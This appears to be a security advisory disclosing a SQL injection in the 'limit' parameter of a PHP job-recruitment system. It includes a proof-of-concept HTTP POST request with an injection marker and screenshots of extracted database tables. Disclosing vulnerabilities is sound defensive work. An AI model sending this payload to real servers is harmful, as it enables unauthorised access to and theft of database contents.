# job-recruitment-in-php has sql injection vulnerability in limit parameter.

## supplier 
https://code-projects.org/job-recruitment-in-php-css-javascript-and-mysql-free-download/
## Vulnerability file
limit parameter.

## describe

An unrestricted SQL injection attack exists in a job-recruitment-system via $limit parameter . The parameters that can be controlled are as follows:  limit parameter . A malicious attacker could exploit this vulnerability to obtain sensitive information in the server database.

**Code analysis**    

When the parameter value of $limit  is obtained , it will be concatenated into SQL statements and executed, which has a SQL injection vulnerability. 

![image-20241226193630575](https://github.com/user-attachments/assets/27840f9a-d4ab-4756-97c9-c3d4c805fa3c)

## POC

```
POST /_parse/_all_edits.php HTTP/1.1
Host: airecruitmentsystem
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Origin: http://airecruitmentsystem
Connection: close
Referer: http://airecruitmentsystem/_parse/_all_edits.php
Cookie: PHPSESSID=koqgqhv09iec6dqukgets9op9p
Upgrade-Insecure-Requests: 1
Priority: u=0, i

limit=1*&action=add_req&skillset1=1
```

**Result**

![image-20241226010957780](https://github.com/user-attachments/assets/e251313b-0522-41ae-aa72-4ec1aa9dd3a8)

Get tables of owlphin

![image-20241226193705624](https://github.com/user-attachments/assets/c27a831b-ecdb-4cf8-90d2-e39bbcc2294f)

**Discover**

西安电子科技大学： 李腾，谢亚轩，刘芮彤